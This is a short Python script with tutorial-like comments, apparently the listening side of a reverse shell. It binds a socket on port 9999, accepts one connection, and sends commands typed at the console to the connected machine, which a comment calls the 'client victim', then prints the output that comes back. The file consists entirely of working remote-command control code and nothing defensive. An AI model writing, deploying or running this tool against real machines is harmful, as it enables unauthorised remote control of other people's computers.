import socket
import sys

# creating the socket (establish a connection between two computers)


def create_socket():
    try:
        global host
        global port
        global s           # Here s is for socket
        host = ''          # here we will write the ip address of host
        port = 9999        # A very uncommon port so we can use this
        s = socket.socket()  # creating a socket
    except socket.error as msg:
        print("Socket creation error " + str(msg))

# binding the socket with host and socket , and listening the connection


def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port : " + str(port))

        s.bind((host, port))  # this is a tuple
        # Server should be continopusly listning from the various computer
        s.listen(5)
        # here 5 is the max bad requests it can listen after that it will throw the error and go in exception block

    except socket.error as msg:
        print("Socket binding error " + str(msg) + "\n" + "Retrying....")
        bind_socket()  # this is recusrion


# Establish connection with the client(Socket must be listening)

def socket_accept():
    conn, address = s.accept()  # This s.accept returns 2 data , 1st is the object of the connection i.e the conversation and the 2nd is the list which contain the ip address and the port
    print("Connection has been established |" + " IP : " +
          address[0] + "| PORT :" + str(address[1]))
    send_command(conn)
    conn.close()  # this will close the connection


# send commands to client victim or a freind to help
def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()  # to close the command prompt

# all things are communicated  in bits and not in strings so we need to encocode it
        if len(str.encode(cmd)) > 0:  # to check if another keys is pressed
            conn.send(str.encode(cmd))
            # this will alsp return us the result of the command
            client_response = str(conn.recv(1024), 'utf-8')
            # when data is recieved we need to convert from byte format to string format
            # when we are recieveng bytes it is send in chunks , default is 1024
            # connection.recieve is for recievening the information back from the client
            # utf-8 stands encoding type
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
